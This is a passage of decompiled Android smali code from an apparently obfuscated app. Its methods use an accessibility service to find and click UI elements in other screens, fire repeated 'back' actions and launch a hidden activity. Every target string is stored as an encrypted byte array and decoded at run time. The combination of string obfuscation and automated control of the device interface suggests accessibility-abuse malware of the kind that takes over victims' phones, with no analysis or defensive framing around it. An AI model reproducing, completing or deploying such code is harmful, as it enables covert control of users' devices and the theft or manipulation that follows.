    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    add-int/lit8 p0, p0, -0x1

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->s1(I)V

    goto :goto_1

    :cond_3
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v3, 0x25

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    invoke-static {v3, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v1

    if-eqz v1, :cond_4

    goto :goto_0

    :cond_4
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    :cond_5
    :goto_1
    return-void

    nop

    :array_0
    .array-data 1
        0x71t
        0x6ct
        0x2t
        0x64t
        -0x2t
        -0x7bt
        0x7ft
        0x4ft
        0x3ct
        0x62t
        0xdt
        0x2ft
        -0x4et
        -0x7bt
        0x6dt
        0xft
        0x74t
        0x6ct
        0x1dt
        0x28t
        -0x1ft
        -0x78t
        0x56t
        0x42t
        0x66t
        0x6dt
    .end array-data

    nop

    :array_1
    .array-data 1
        0x12t
        0x3t
        0x6ft
        0x4at
        -0x78t
        -0x14t
        0x9t
        0x20t
    .end array-data

    :array_2
    .array-data 1
        0x18t
        0x59t
        0x79t
        0x79t
        -0x63t
        -0x62t
        0x46t
        0x24t
        0x55t
        0x57t
        0x76t
        0x32t
        -0x2ft
        -0x62t
        0x54t
        0x64t
        0x17t
        0x5ft
        0x67t
        0x23t
        -0x4ct
        -0x7ft
        0x59t
        0x2et
        0xct
    .end array-data

    nop

    :array_3
    .array-data 1
        0x7bt
        0x36t
        0x14t
        0x57t
        -0x15t
        -0x9t
        0x30t
        0x4bt
    .end array-data

    :array_4
    .array-data 1
        0x56t
        -0x11t
        -0x24t
        0x19t
        -0x45t
        0x38t
        0x55t
        0x4ft
        0x1bt
        -0x10t
        -0x22t
        0x40t
        -0x49t
        0x3bt
        0x49t
        0x41t
        0x43t
        -0x17t
        -0x21t
        0x50t
        -0x18t
        0x20t
        0x5et
        0xft
        0x47t
        -0x1bt
        -0x2et
        0x4et
        -0x4ft
        0x25t
        0x5ft
        0x52t
        0x6at
        -0xat
        -0x28t
        0x52t
        -0x5bt
    .end array-data

    nop

    :array_5
    .array-data 1
        0x35t
        -0x80t
        -0x4ft
        0x37t
        -0x2et
        0x49t
        0x3at
        0x20t
    .end array-data
.end method

.method private static synthetic s2(Landroid/content/Context;)V
    .locals 4

    .line 1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1e

    if-lt v0, v1, :cond_0

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/s1;->a()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->c1()V

    :cond_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/uy;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/uy;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x9c4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static synthetic t(Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->V1(Landroid/os/Handler;)V

    return-void
.end method

.method static synthetic t0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->B1()V

    return-void
.end method

.method private static t1()V
    .locals 11

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x28

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x2d

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :cond_0
    if-eqz v0, :cond_f

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v3, 0xf

    new-array v4, v3, [B

    fill-array-data v4, :array_4

    new-array v5, v2, [B

    fill-array-data v5, :array_5

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_1

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v4, 0x25

    new-array v4, v4, [B

    fill-array-data v4, :array_6

    new-array v5, v2, [B

    fill-array-data v5, :array_7

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    :cond_1
    if-eqz v1, :cond_f

    sget-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u:Z

    const/16 v5, 0x12c

    const/4 v6, 0x0

    const/4 v7, 0x2

    const/4 v8, 0x1

    if-eqz v4, :cond_6

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/16 v0, 0x22

    new-array v0, v0, [B

    fill-array-data v0, :array_8

    new-array v2, v2, [B

    fill-array-data v2, :array_9

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_5

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-lt v1, v7, :cond_5

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    sub-int/2addr v1, v8

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    sub-int/2addr v2, v7

    filled-new-array {v1, v2}, [I

    move-result-object v1

    move v2, v6

    :goto_0
    if-ge v2, v7, :cond_4

    aget v3, v1, v2

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v3, :cond_3

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v4

    if-lez v4, :cond_3

    invoke-virtual {v3, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_2

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Q0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_2
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    return-void

    :cond_3
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    return-void

    :cond_4
    :goto_1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0, v8}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->v1()V

    goto/16 :goto_5

    :cond_5
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    return-void

    :cond_6
    sget-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->t:Z

    if-eqz v4, :cond_9

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/16 v0, 0x2f

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v2, v2, [B

    fill-array-data v2, :array_b

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_8

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-lt v1, v7, :cond_8

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    sub-int/2addr v1, v8

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    sub-int/2addr v2, v7

    filled-new-array {v1, v2}, [I

    move-result-object v1

    :goto_2
    if-ge v6, v7, :cond_4

    aget v2, v1, v6

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v2, :cond_7

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Q0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    add-int/lit8 v6, v6, 0x1

    goto :goto_2

    :cond_7
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    return-void

    :cond_8
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    return-void

    :cond_9
    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/16 v4, 0x13

    new-array v9, v4, [B

    fill-array-data v9, :array_c

    new-array v10, v2, [B

    fill-array-data v10, :array_d

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v1, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_e

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v9

    if-nez v9, :cond_e

    invoke-interface {v1, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Q0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v9, v3, [B

    fill-array-data v9, :array_e

    new-array v10, v2, [B

    fill-array-data v10, :array_f

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-static {v1, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_d

    :goto_3
    const/4 v9, 0x3

    if-ge v6, v9, :cond_a

    :try_start_0
    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    add-int/lit8 v6, v6, 0x1

    goto :goto_3

    :catchall_0
    move-exception v0

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    throw v0

    :cond_a
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v3, [B

    fill-array-data v1, :array_10

    new-array v3, v2, [B

    fill-array-data v3, :array_11

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_c

    :try_start_1
    new-array v1, v4, [B

    fill-array-data v1, :array_12

    new-array v2, v2, [B

    fill-array-data v2, :array_13

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_b

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v2

    if-lt v2, v7, :cond_b

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v2

    sub-int/2addr v2, v7

    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v3

    sub-int/2addr v3, v8

    invoke-interface {v1, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Q0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Q0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v8}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->v1()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    return-void

    :catchall_1
    move-exception v1

    goto :goto_4

    :cond_b
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    goto/16 :goto_1

    :goto_4
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    throw v1

    :cond_c
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    return-void

    :cond_d
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    return-void

    :cond_e
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    return-void

    :cond_f
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    :goto_5
    return-void

    nop

    :array_0
    .array-data 1
        -0x26t
        -0x30t
        0x6et
        0x1et
        -0x7ft
        -0x5t
        -0x78t
        -0x4et
        -0x69t
        -0x31t
        0x6ct
        0x47t
        -0x73t
        -0x8t
        -0x6ct
        -0x44t
        -0x31t
        -0x2at
        0x6dt
        0x57t
        -0x2et
        -0x1dt
        -0x7dt
        -0xet
        -0x2ct
        -0x30t
        0x71t
        0x55t
        -0x49t
        -0x7t
        -0x7et
        -0x57t
        -0x33t
        -0x2at
        0x6dt
        0x57t
        -0x65t
        -0x2bt
        -0x6dt
        -0x55t
    .end array-data

    :array_1
    .array-data 1
        -0x47t
        -0x41t
        0x3t
        0x30t
        -0x18t
        -0x76t
        -0x19t
        -0x23t
    .end array-data

    :array_2
    .array-data 1
        0x6t
        0xft
        0xft
        -0x46t
        -0x68t
        -0x24t
        0x21t
        -0x5bt
        0x4bt
        0x10t
        0xdt
        -0x1dt
        -0x6ct
        -0x21t
        0x3dt
        -0x55t
        0x13t
        0x9t
        0xct
        -0xdt
        -0x35t
        -0x3ct
        0x2at
        -0x1bt
        0x16t
        0x1t
        0x14t
        -0x3t
        -0x61t
        -0x36t
        0x11t
        -0x59t
        0x4t
        0xet
        0x3t
        -0xdt
        -0x6ct
        -0xet
        0x2dt
        -0x5bt
        0xbt
        0x14t
        0x7t
        -0x6t
        -0x7bt
    .end array-data

    nop

    :array_3
    .array-data 1
        0x65t
        0x60t
        0x62t
        -0x6ct
        -0xft
        -0x53t
        0x4et
        -0x36t
    .end array-data

    :array_4
    .array-data 1
        0x4t
        -0x3ft
        -0x21t
        0x3ft
        -0x22t
        0xdt
        -0x4bt
        -0x10t
        0xct
        -0x35t
        -0x6ct
        0x21t
        -0x28t
        0x17t
        -0x5bt
    .end array-data

    :array_5
    .array-data 1
        0x65t
        -0x51t
        -0x45t
        0x4dt
        -0x4ft
        0x64t
        -0x2ft
        -0x36t
    .end array-data

    :array_6
    .array-data 1
        -0x67t
        -0x2et
        -0x7et
        0x3ct
        0x20t
        0x5at
        -0x16t
        -0x5at
        -0x2ct
        -0x33t
        -0x80t
        0x65t
        0x2ct
        0x59t
        -0xat
        -0x58t
        -0x74t
        -0x2ct
        -0x7ft
        0x75t
        0x73t
        0x42t
        -0x1ft
        -0x1at
        -0x78t
        -0x28t
        -0x74t
        0x6bt
        0x2at
        0x47t
        -0x20t
        -0x45t
        -0x5bt
        -0x35t
        -0x7at
        0x77t
        0x3et
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x6t
        -0x43t
        -0x11t
        0x12t
        0x49t
        0x2bt
        -0x7bt
        -0x37t
    .end array-data

    :array_8
    .array-data 1
        -0x4t
        -0xbt
        -0x21t
        -0x5bt
        -0x1ft
        -0x25t
        -0x1dt
        0x77t
        -0x4ft
        -0x16t
        -0x23t
        -0x4t
        -0x13t
        -0x28t
        -0x1t
        0x79t
        -0x17t
        -0xdt
        -0x24t
        -0x14t
        -0x4et
        -0x3dt
        -0x18t
        0x37t
        -0x14t
        -0x13t
        -0x25t
        -0x1t
        -0x15t
        -0x3et
        -0x2dt
        0x7at
        -0x15t
        -0xct
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x61t
        -0x66t
        -0x4et
        -0x75t
        -0x78t
        -0x56t
        -0x74t
        0x18t
    .end array-data

    :array_a
    .array-data 1
        0x5ft
        0x48t
        -0x50t
        0x51t
        -0x7ft
        0x70t
        0x2dt
        -0x7et
        0x12t
        0x57t
        -0x4et
        0x8t
        -0x73t
        0x73t
        0x31t
        -0x74t
        0x4at
        0x4et
        -0x4dt
        0x18t
        -0x2et
        0x68t
        0x26t
        -0x3et
        0x5et
        0x46t
        -0x57t
        0xbt
        -0x73t
        0x73t
        0x3bt
        -0x4et
        0x4ft
        0x44t
        -0x51t
        0x1at
        -0x73t
        0x6ft
        0x1dt
        -0x72t
        0x54t
        0x42t
        -0x42t
        0x14t
        -0x76t
        0x6et
        0x3at
    .end array-data

    :array_b
    .array-data 1
        0x3ct
        0x27t
        -0x23t
        0x7ft
        -0x18t
        0x1t
        0x42t
        -0x13t
    .end array-data

    :array_c
    .array-data 1
        0x7et
        -0x67t
        -0x14t
        -0x5at
        0x1dt
        -0x58t
        0xft
        -0x10t
        0x76t
        -0x6dt
        -0x59t
        -0x49t
        0x1at
        -0x5ct
        0x8t
        -0x5ft
        0x7dt
        -0x68t
        -0x10t
    .end array-data

    :array_d
    .array-data 1
        0x1ft
        -0x9t
        -0x78t
        -0x2ct
        0x72t
        -0x3ft
        0x6bt
        -0x36t
    .end array-data

    :array_e
    .array-data 1
        0x38t
        -0x53t
        -0x76t
        0xbt
        -0x6bt
        -0x42t
        -0x29t
        -0x27t
        0x30t
        -0x59t
        -0x3ft
        0x15t
        -0x6dt
        -0x5ct
        -0x39t
    .end array-data

    :array_f
    .array-data 1
        0x59t
        -0x3dt
        -0x12t
        0x79t
        -0x6t
        -0x29t
        -0x4dt
        -0x1dt
    .end array-data

    :array_10
    .array-data 1
        0x3t
        0xdt
        0x35t
        0x79t
        0xct
        0x20t
        0x6et
        0x31t
        0xbt
        0x7t
        0x7et
        0x67t
        0xat
        0x3at
        0x7et
    .end array-data

    :array_11
    .array-data 1
        0x62t
        0x63t
        0x51t
        0xbt
        0x63t
        0x49t
        0xat
        0xbt
    .end array-data

    :array_12
    .array-data 1
        0x22t
        -0x71t
        0xat
        -0x7t
        0x7ct
        -0x4ft
        0x37t
        -0x14t
        0x2at
        -0x7bt
        0x41t
        -0x18t
        0x7bt
        -0x43t
        0x30t
        -0x43t
        0x21t
        -0x72t
        0x16t
    .end array-data

    :array_13
    .array-data 1
        0x43t
        -0x1ft
        0x6et
        -0x75t
        0x13t
        -0x28t
        0x53t
        -0x2at
    .end array-data
.end method

.method private static synthetic t2()V
    .locals 1

    .line 1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->i:Z

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h1(Landroid/accessibilityservice/AccessibilityService;)V

    return-void
.end method

.method public static synthetic u()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Z1()V

    return-void
.end method

.method static synthetic u0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->E1()V

    return-void
.end method

.method private static u1()V
    .locals 4

    .line 1
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/16 v1, 0x14

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0x2f

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/4 v0, 0x0

    :goto_0
    const/4 v1, 0x3

    if-ge v0, v1, :cond_0

    :try_start_0
    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const/16 v1, 0xc8

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

